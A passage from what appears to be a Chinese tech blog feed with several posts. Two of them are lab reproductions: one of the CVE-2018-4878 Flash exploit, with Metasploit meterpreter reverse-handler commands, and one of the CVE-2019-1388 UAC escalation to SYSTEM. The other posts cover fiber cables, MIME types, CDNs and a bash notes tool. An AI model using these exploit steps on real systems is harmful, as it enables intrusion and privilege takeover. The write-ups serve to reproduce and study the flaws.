/var/www/html</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE <span class="token comment" spellcheck="true"># cp exploit.swf index2.html /var/www/html/</span>root@kali:~/CVE <span class="token comment" spellcheck="true"># systemctl start apache2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="开启-metasploit"><a href="#开启-metasploit" class="headerlink" title="开启 metasploit"></a>开启 metasploit</h3><p>root@kali:/var/www/html# msfconsole<br>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; set payload windows/meterpreter<br>msf5 exploit(multi/handler) &gt; set lhost 192.168.150.142<br>lhost =&gt; 192.168.150.142<br>msf5 exploit(multi/handler) &gt; set lport 6666<br>lport =&gt; 6666<br>msf5 exploit(multi/handler) &gt; run</p><p>[*] Started reverse TCP handler on 192.168.150.142:6666 </p><h3 id="win7-使用-firefox-打开-192-168-150-142-index2-html，并运行-flash"><a href="#win7-使用-firefox-打开-192-168-150-142-index2-html，并运行-flash" class="headerlink" title="win7 使用 firefox 打开 192.168.150.142/index2.html，并运行 flash"></a>win7 使用 firefox 打开 192.168.150.142/index2.html，并运行 flash</h3><p><img src="https://i.loli.net/2020/01/06/M4TBJhFqEkQ1o6V.png" alt="2018-4878-3.png"></p><p>这时渗透机直接获取到Sessions</p><p><img src="https://i.loli.net/2020/01/06/EueUt8oB7sMfXRg.png" alt="2018-4878-4.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://blog.csdn.net/qq_40182439/article/details/80417690" target="_blank" rel="noopener">[漏洞复现] CVE-2018-4878 Flash 0day</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flash player </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>光纤跳线和尾纤详解</title>
      <link href="/2019/12/29/%E5%85%89%E7%BA%A4%E8%B7%B3%E7%BA%BF%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/12/29/%E5%85%89%E7%BA%A4%E8%B7%B3%E7%BA%BF%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是跳线和尾纤"><a href="#什么是跳线和尾纤" class="headerlink" title="什么是跳线和尾纤"></a>什么是跳线和尾纤</h2><hr><p>跳线是与桌面计算机或设备直接相连接的线缆，以方便设备的连接和管理，跳线有较厚的保护层，常用于终端盒和光端机之间。</p><p>尾纤又叫猪尾线只有一端有连接头，而另一端是一根光缆纤芯的断头，通过熔接与其他光缆纤芯相连，一般出现在光纤终端盒内。</p><p><img src="https://pic4.zhimg.com/v2-6b4821d94a3edd2d12af7f4961306a91_1200x500.jpg" alt=" "></p><h2 id="光纤跳线的分类"><a href="#光纤跳线的分类" class="headerlink" title="光纤跳线的分类"></a>光纤跳线的分类</h2><hr><p>光纤跳线按传输媒介的不同可分为常见的硅基光纤的单模、多模跳线，还有其它如以塑胶等为传输媒介的光纤跳线</p><p><img src="https://pic3.zhimg.com/80/v2-5a587e3357f7e24a9001d46c0190ea32_hd.jpg" alt=" "></p><p>单模光纤跳线一般为黄色，接头和保护套为蓝色，波长为1310nm/1550nm，传输距离为10km/40km，传输距离长；多模光纤跳线：一般为橙色或者湖水蓝，接头和保护套为米色或者黑色，波长为850nm，传输距离为500m，传输距离短。</p><p><img src="https://pic1.zhimg.com/80/v2-43cde0f63e3b40f8ffbaca48286a056c_hd.jpg" alt="双LC多模光纤"></p><p><img src="https://pic1.zhimg.com/80/v2-33fb8cb6fcddbbf0628aafad132fa858_hd.jpg" alt="双LC单模光纤"></p><p>光纤跳线根据连接器的类型一般可分为以下几种：</p><ol><li>LC型光纤跳线：方型连接头，采用操作方便模块化插孔（RJ）闩锁机理制成，是连接SFP光模块的连接器，常用于路由器当中。</li></ol><p><img src="https://pic1.zhimg.com/80/v2-33fb8cb6fcddbbf0628aafad132fa858_hd.jpg" alt="双LC单模光纤"></p><ol start="2"><li>SC型光纤跳线：矩形连接头，采用插拔销闩式紧固方式，是连接GBIC光模块的连接器，常用于路由器和交换机上。</li></ol><p><img src="https://pic2.zhimg.com/80/v2-955168a3c727856c9d8a5c147e6d1c59_hd.jpg" alt="SC-SC单模"></p><ol start="3"><li>ST型光纤跳线：圆头连接头，采用螺丝扣紧固，常用光纤配线架上。</li></ol><p><img src="https://pic2.zhimg.com/80/v2-231fb0ab88b3b243cccd50e7e35a4ad1_hd.jpg" alt="ST-ST单模"></p><ol start="4"><li>FC型光纤跳线：圆形光纤连接头，外部采用金属材质，同样也是采用螺丝扣紧固，一般用在ODF侧。</li></ol><p><img src="https://pic4.zhimg.com/80/v2-b7346b78b38612f858c5932baf6e17d3_hd.jpg" alt="FC-FC单模"></p><ol start="5"><li>MPO型光纤跳线：由两个高精度塑料成型的连接器和光缆组成，采用小型化设计，密度大连接稳定可靠。</li></ol><p><img src="https://pic4.zhimg.com/80/v2-5393bdf5e27ce42e8b56ecba5e86529f_hd.jpg" alt="MPO光纤跳线"></p><ol start="6"><li>MTP型光纤跳线：芯数多，体积小的光纤跳线，应用于高密度集成光纤线路环境中</li></ol><p><img src="https://pic2.zhimg.com/v2-523e045f95c388521c472b4eaf4b8c9d_r.jpg" alt="MPT光纤跳线"></p><p><img src="https://pic4.zhimg.com/80/v2-ee34f9e0003aaec5968adb6d8addabc7_hd.jpg" alt="光纤跳线类型"></p><p>注：MTP连接器是MPO连接器的一种。</p><h2 id="尾纤类型"><a href="#尾纤类型" class="headerlink" title="尾纤类型"></a>尾纤类型</h2><hr><p>尾纤和光纤跳线类型一样，这里不过多介绍。</p><p><img src="https://pic2.zhimg.com/80/v2-8ebb69f10b9fda8ad285992ff6e50401_hd.jpg" alt="尾纤类型"></p><h2 id="跳线和尾纤的应用"><a href="#跳线和尾纤的应用" class="headerlink" title="跳线和尾纤的应用"></a>跳线和尾纤的应用</h2><hr><p>跳线主要用于光纤配线架或光纤信息插座到交换机之间的连接、交换机与交换机之间的连接、交换机与桌面计算机之间的连接以及光纤信息插座到桌面计算机之间的连接，可应用于管理、设备间和工作区子系统。</p><p>尾纤主要应用于光纤通信系统、光纤接入网、光纤数据传输、光纤 CATV、局域网(LAN)、测试设备、光纤传感器、串口服务器、FTTH/FTTX、电信网络和预端接安装。</p><h2 id="跳线和尾纤的注意事项"><a href="#跳线和尾纤的注意事项" class="headerlink" title="跳线和尾纤的注意事项"></a>跳线和尾纤的注意事项</h2><hr><ol><li><p>跳线连接的光模块收发波长必须相同，一般情况下，短波光模块搭配多模跳线，长波光模块搭配单模跳线，以保证数据传输的准确性。</p></li><li><p>跳线在布线过程中尽可能的减少绕圈，这样可以减少在传输过程中光信号的衰减。</p></li><li><p>跳线的接头应保持干净，在使用后应用保护套将接头封装起来，以防油渍和灰尘进入，如果弄上了污渍，应用棉签蘸取酒精清洁。</p></li><li><p>尾纤比较纤细，尾纤横截面呈8度角，不耐高温，超过100℃就会破损，因此要避免在高温环境下使用。</p></li></ol><p>光纤连接器是光纤通信的重要组成部分，在数据传输方面，插芯的好坏、制作的技术与方法都决定了数据传输的稳定性。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://zhuanlan.zhihu.com/p/97001442" target="_blank" rel="noopener">全面解析光纤跳线与尾纤的区别及使用注意事项</a></p><p><a href="https://zhuanlan.zhihu.com/p/35701459" target="_blank" rel="noopener">光纤跳线详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/24173339" target="_blank" rel="noopener">MTP/MPO主干光纤跳线，为何如此受青睐？</a></p><p><a href="https://zhuanlan.zhihu.com/p/40631062" target="_blank" rel="noopener">[MPO/MTP区别]全面介绍MPO光纤跳线参数及应用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 光通信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 光纤 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是 MIME types</title>
      <link href="/2019/12/29/%E4%BB%80%E4%B9%88%E6%98%AFMIME%20types/"/>
      <url>/2019/12/29/%E4%BB%80%E4%B9%88%E6%98%AFMIME%20types/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr><p>在浏览器中显示的内容有 HTML、有 XML、有 GIF、还有 Flash ……那么，浏览器是如何区分它们，决定什么内容用什么形式来显示呢？答案是 MIME Type，也就是该资源的媒体类型。</p><p>媒体类型通常是通过 HTTP 协议，由 Web 服务器告知浏览器的，更准确地说，是通过 Content-Type 来表示的，例如: <code>Content-Type: text/HTML</code> ，表示内容是 text/HTML 类型，也就是超文本文件。MIME type 是一个标准，编写格式和内容都是已经固定好的。</p><p>通常只有一些在互联网上获得广泛应用的格式才会获得一个 MIME Type，如果是某个客户端自己定义的格式，一般只能以 application/x- 开头。当然，处理本地的文件，在没有人告诉浏览器某个文件的 MIME Type 的情况下，浏览器也会做一些默认的处理。</p><h2 id="多媒体文件格式-MIME"><a href="#多媒体文件格式-MIME" class="headerlink" title="多媒体文件格式 MIME"></a>多媒体文件格式 MIME</h2><hr><p>最早的 HTTP 协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言 HTML 文档，而为了支持多媒体数据类型，HTTP 协议中就使用了附加在文档之前的 MIME 数据类型信息来标识数据类型。</p><p>MIME 意为多目 Internet 邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被 HTTP 协议支持之后，它的意义就更为显著了。它使得 HTTP 传输的不仅是普通的文本，而变得丰富多彩。</p><p>每个 MIME 类型由两部分组成：前面是数据的大类别（主类型），例如声音audio、图象image等，后面定义具体的种类（子类型）。</p><p>很多时候，如果在后台服务器没有定义 子类型 的时候，文本文件默认为 text/plain，而二进制文件则默认为 application/octet-stream。</p><h2 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h2><hr><ul><li><p>text</p><ol><li>text/html</li><li>text/css</li><li>text/javascript</li><li>text/plain</li><li>text/markdown</li></ol></li><li><p>image</p><ol><li>image/jpeg</li><li>image/png</li><li>image/svg</li></ol></li><li><p>video</p><ol><li>video/mp4</li></ol></li><li><p>audio</p><ol><li>audio/ogg</li></ol></li><li><p>application</p><ol><li>application/json</li><li>application/xml</li><li>application/pdf</li><li>application/octet-stream</li></ol></li></ul><ul><li>multipart<ol><li>multipart/form-data</li></ol></li></ul><p>注：multipart 表示具有多个 MIME types 的一组 document. 比如 multipart/form-data 就是通常由 HTTP FORM 的 post 方法发送出的文件表格格式。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://www.cnblogs.com/jsean/articles/1610265.html" target="_blank" rel="noopener">什么是 MIME TYPE？</a></p><p><a href="https://juejin.im/post/5c4942bc518825253806512c" target="_blank" rel="noopener">什么是 MIME types</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是CDN</title>
      <link href="/2019/12/07/%E4%BB%80%E4%B9%88%E6%98%AFCDN/"/>
      <url>/2019/12/07/%E4%BB%80%E4%B9%88%E6%98%AFCDN/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr><p>CDN 的全称是(Content Delivery Network)，即内容分发网络。其目的是通过在现有的 Internet 中增加一层新的 CACHE(缓存)层，将网站的内容发布到最接近用户的网络”边缘“的节点，使用户可以就近取得所需的内容，提高用户访问网站的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。</p><h2 id="常见名词"><a href="#常见名词" class="headerlink" title="常见名词"></a>常见名词</h2><hr><ol><li><p>Origin Server源站</p><p> 网站的真正的服务器地址。</p></li><li><p>User</p><p> 访问者，也就是要访问网站的网民。</p></li><li><p>Last Mile</p><p> 最后一公里，也就是网民到他所访问到的 CDN 服务器之间的路径。</p></li><li><p>域名</p><p> 服务器默认都会有一个 IP 地址，但是因为数字多不方便记忆，就用容易记忆的域名代替 IP 地址引导访客进入网站点。全世界，没有重复的域名。</p></li><li><p>A 记录</p><p> A 记录用来记录域名对应的 IP 地址，下图的主机记录是域名前缀，记录值是 IP 地址，其他无需修改。主域名的主机记录是@，国内常用的域名前缀是 www，mail 之类的，也可以自定义。</p><p> A 记录是使用频率最高的了，很多网站默认使用 A 记录解析域名。不过也有缺点就是容易被发现服务器的真实 IP，导致 DDOS 攻击。</p><p> <img src="https://ask.qcloudimg.com/http-save/yehe-1182806/a0f0mapek1.png?imageView2/2/w/1620" alt=""></p></li><li><p>CNAME 记录</p><p> CNAME 记录也是一种和 A 记录功能差不多的域名记录方式，它们之间的区别是 A 记录指向 IP 地址，CNAME 记录指向域名。</p><p> 因此也叫别名记录，用来把域名解析到别的域名上。常用于 mail 邮箱解析和 CDN 加速解析，特别是 CDN 加速解析是现在 CNAME 记录最大的用途了。如下图主机记录是 www（或自定义），记录类型是 CNAME，记录值是从 CDN 加速网站获取的。也就是说将自己的加速域名指向这个 CNAME 域名，这样该域名所有的请求才会都将转向 CDN 的节点，达到加速效果。</p><p> <img src="https://ask.qcloudimg.com/http-save/yehe-1182806/x0800oupe7.png?imageView2/2/w/1620" alt=""></p></li><li><p>DNS</p><p> DNS 即 Domain Name System，是域名解析服务的意思。它在互联网的作用是：把域名转换成为网络可以识别的ip地址。人们习惯记忆域名，但机器间互相只认IP地址，域名与 IP 地址之间是一一对应的，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，整个过程是自动进行的。比如：上网时输入的百度一下，你就知道会自动转换成为220.181.112.143</p></li><li><p>边缘节点</p><p> 也称 CDN 节点、Cache 节点等；是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用 cache 设备上，以此来提高网站访问的速度和质量。</p></li><li><p>cache</p><p> cache 高速缓冲存储器一种特殊的存储器子系统，其中复制了频繁使用的数据以利于快速访问。存储器的高速缓冲存储器存储了频繁访问的 RAM 位置的内容及这些数据项的存储地址。当处理器引用存储器中的某地址时，高速缓冲存储器便检查是否存有该地址。如果存有该地址，则将数据返回处理器;如果没有保存该地址，则进行常规的存储器访问。因为高速缓冲存储器总是比主 RAM 存储器速度快，所以当 RAM 的访问速度低于微处理器的速度时，常使用高速缓冲存储器。</p></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><hr><p>就以访问一个网站为例：</p><ol><li><p>当用户点击网站链接时，首先经过本地的 DNS 系统解析，DNS 系统最终会将域名的解析权交给 CNAME 指向的 CDN 专用 DNS 服务器</p></li><li><p>CDN 的 DNS 服务器将CDN的全局负载均衡设备 IP 地址返回给用户</p></li><li><p>用户向 CDN 的全局负载均衡设备发起 URL 访问请求</p></li><li><p>CDN 全局负载均衡设备根据用户的 IP 地址，以及用户请求的 URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求</p></li><li><p>区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择依据包括：根据用户的 IP 地址，判断哪一台服务器距离用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需的内容；查询各个服务器当前负载情况，判断哪一台服务器有服务能力基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。</p></li><li><p>全局负载均设备把服务器的IP地址返回给用户。</p></li><li><p>用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需的内容传送到用户终端。如果这台缓存服务器上并内有用户想要的内容，而区域服设备依然将它分配给了用户，那么这台服务器就要向上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</p></li></ol><p><img src="https://pic1.zhimg.com/80/v2-7d4409a2d13943df2ca9c15defaec8c6_hd.jpg" alt=""></p><h2 id="CDN-的优势"><a href="#CDN-的优势" class="headerlink" title="CDN 的优势"></a>CDN 的优势</h2><hr><ol><li>跨运营商、地域的全网覆盖、网站访问速度更快</li><li>CDN 负载均衡和 CNAME 别名解析保障网站安全</li><li>当某个服务器发生意外故障，系统将会调用其他健康的服务器进行服务，异地备份</li><li>不需要技术运维，节约成本投入、精力、财力</li><li>让你更专注业务本身</li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://www.zhihu.com/question/36514327/answer/193768864" target="_blank" rel="noopener">CDN是什么？使用CDN有什么优势？</a></p><p><a href="https://cloud.tencent.com/developer/article/1349559" target="_blank" rel="noopener">域名 A 记录和 CNAME 记录区别在哪？如何选择？</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-1388</title>
      <link href="/2019/12/01/CVE-2019-1388/"/>
      <url>/2019/12/01/CVE-2019-1388/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞位于 Windows 的 UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的 UAC 提示——Secure Desktop。这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以 NT AUTHORITY\SYSTEM 权限运行，完整性级别为 System。因为用户可以与该 UI 交互，因此对 UI 来说紧限制是必须的。否则，低权限的用户可能可以通过 UI 操作的循环路由以 SYSTEM 权限执行操作。即使隔离状态的看似无害的 UI 特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC 会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到 SYSTEM。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>SERVER======Windows 2008r2    7601    ** link OPENED AS SYSTEM **Windows 2012r2    9600    ** link OPENED AS SYSTEM **Windows 2016    14393    ** link OPENED AS SYSTEM **Windows 2019    17763    link NOT openedWORKSTATION===========Windows 7 SP1    7601    ** link OPENED AS SYSTEM **Windows 8        9200    ** link OPENED AS SYSTEM **Windows 8.1        9600    ** link OPENED AS SYSTEM **Windows 10 1511    10240    ** link OPENED AS SYSTEM **Windows 10 1607    14393    ** link OPENED AS SYSTEM **Windows 10 1703    15063    link NOT openedWindows 10 1709    16299    link NOT opened...</code></pre><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><strong>操作系统：</strong> windows 7 sp1 x86</p><p><strong>EXP：</strong> <a href="https://github.com/jas502n/CVE-2019-1388">https://github.com/jas502n/CVE-2019-1388</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><strong>登录 guest 账户，并上传 HHUPD.exe</strong></li></ol><p><img src="https://i.loli.net/2019/12/01/rRygvB2cPVQ7kxz.png" alt="CVE-2019-1388-1.png"></p><ol start="2"><li><strong>以管理员权限打开程序</strong></li></ol><p>点击 “显示详细信息” –&gt; “显示有关此发布者的证书信息” –&gt; “颁发者：…..” –&gt; 关闭所有程序窗口</p><p><img src="https://i.loli.net/2019/12/01/5ME1mK8yXk9fZvL.png" alt="CVE-2019-1388-2.png"></p><p>点击超链接会从 consent.exe 启动浏览器，浏览器会以 NT AUTHORITY\SYSTEM 权限运行。虽然浏览器是以 SYSTEM 权限运行的，但是是一个正常的桌面而非 Secure Desktop。</p><ol start="3"><li><strong>提权</strong></li></ol><ul><li>选择刚才打开的网页，点击 “页面” –&gt; “另存”</li></ul><p><img src="https://i.loli.net/2019/12/01/BLUk5RmsArCcS2x.png" alt="CVE-2019-1388-3.png"></p><ul><li>在文件命中输入：C:\Windows\System32*.* 并回车</li></ul><p><img src="https://i.loli.net/2019/12/01/Ekjb4LmU3sYfFch.png" alt="CVE-2019-1388-4.png"></p><ul><li>找到 cmd.exe ，并右击打开</li></ul><p><img src="https://i.loli.net/2019/12/01/kMVuXIos7waBpYl.png" alt="CVE-2019-1388-5.png"></p><ul><li>成功提权到 system 权限</li></ul><p><img src="https://i.loli.net/2019/12/01/OUp7V6qi23gNEde.png" alt="CVE-2019-1388-6.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.cnblogs.com/Sylon/p/11941276.html" target="_blank" rel="noopener">CVE-2019-1388 UAC提权复现</a></p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388</a></p><p><a href="https://www.4hou.com/info/news/21710.html" target="_blank" rel="noopener">CVE-2019-1388： Windows UAC权限提升漏洞</a></p><p><a href="http://www.8sec.cc/index.php/archives/335/" target="_blank" rel="noopener">CVE-2019-1388本地提权复现</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> UAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dn</title>
      <link href="/2019/11/30/dn/"/>
      <url>/2019/11/30/dn/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git colne https://github.com/tomlockwood/dn.git</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#cd dn &amp;&amp; cat dn &gt;&gt; ~/.bashrc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><hr><p>dn：创建笔记（以日期来命名）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dn "The same thing we do every night"</span><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat 2019-11-30 </span> * The same thing we <span class="token keyword">do</span> every night<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>dno：和 dn 是一样的效果，但是第一个参数是文件名，用于给笔记添加注释</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dno 2019-11-30 "fuck"</span><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat 2019-11-30 </span> * The same thing we <span class="token keyword">do</span> every night * fuck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>dnt：显示今天的笔记</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dnt</span>2019-11-30 * The same thing we <span class="token keyword">do</span> every night * fuck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>dnview：查看所有的笔记，或者查看指定笔记</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dnview</span>2019-11-30 * The same thing we <span class="token keyword">do</span> every night * fuck<span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dnview 2019-11-30 </span>2019-11-30 * The same thing we <span class="token keyword">do</span> every night * fuck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dnte：编辑今天的笔记</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dnte</span> * The same thing we <span class="token keyword">do</span> every night * fuck ~ ~ ~ <span class="token string">"~/dn/2019-11-30"</span> 2L, 44C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dnoe：编辑指定笔记，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost dn<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># dnoe 2019-11-30</span> * The same thing we <span class="token keyword">do</span> every night * fuck ~ ~ ~ <span class="token string">"~/dn/2019-11-30"</span> 2L, 44C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><hr><h3 id="设置环境变量-DN-PATH"><a href="#设置环境变量-DN-PATH" class="headerlink" title="设置环境变量 DN_PATH"></a>设置环境变量 DN_PATH</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Daily Notes Aliases</span><span class="token function">export</span> DN_PATH<span class="token operator">=</span>~/dn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="dn"><a href="#dn" class="headerlink" title="dn"></a>dn</h3><ul><li>$1：表示从命令行接收第一个参数值。<br>例如：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">$ dn <span class="token string">"The same thing we do every night"</span><span class="token comment" spellcheck="true"># The same thing we do every night 就是第一个参数值。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 输出"* 【第一个参数值】" 并追加到 ~/dn/2019-11-30 中</span>dn<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">" * <span class="token variable">$1</span>"</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$DN_PATH</span>/<span class="token punctuation">$(</span>date <span class="token string">"+%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dno"><a href="#dno" class="headerlink" title="dno"></a>dno</h3><ul><li>$2；表示从命令行接收第二个参数<br>例如：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">$ dno 2019-11-30 <span class="token string">"fuck"</span><span class="token comment" spellcheck="true"># 2019-11-30 第一个参数</span><span class="token comment" spellcheck="true"># fuck 第二个参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 输出"* 【dno 命令的第二个参数值】" 并追加到 ~/dn/【dno 命令的第一个参数值】 中</span>dno<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">" * <span class="token variable">$2</span>"</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$DN_PATH</span>/<span class="token variable">$1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dnoe"><a href="#dnoe" class="headerlink" title="dnoe"></a>dnoe</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 编辑 ~/dn/【dnoe 命令的第一个参数值】文件</span>dnoe<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  vim <span class="token variable">$DN_PATH</span>/<span class="token variable">$1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dnt"><a href="#dnt" class="headerlink" title="dnt"></a>dnt</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 输出今天的日期（2019-11-30），查看今天的笔记（2019-11-30）</span>dnt<span class="token punctuation">(</span><span class="token punctuation">)</span> 